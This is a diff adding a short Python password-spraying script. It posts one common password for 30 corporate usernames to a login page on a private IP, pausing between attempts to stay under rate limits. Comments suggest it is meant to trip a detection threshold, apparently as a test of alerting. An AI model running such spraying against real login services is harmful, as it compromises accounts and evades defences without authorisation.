@@ -1,0 +1,17 @@
+import requests
+import time
+
+target_url = "http://192.168.1.10/login"
+attacker_ip = "192.168.1.50"
+usernames = [f"user{i}@corp.local" for i in range(1, 31)] # 30 distinct users
+
+# 60 attempts (2 per user) to trigger >50 threshold
+for i in range(60):
+    user = usernames[i % len(usernames)]
+    payload = {"username": user, "password": "Fall2023!"}
+    try:
+        response = requests.post(target_url, data=payload, timeout=2)
+        print(f"Attempt {i+1}: {user} - Status {response.status_code}")
+    except Exception as e:
+        print(f"Connection error: {e}")
+    time.sleep(0.5) # 0.5 sec delay to avoid instant rate-limiting
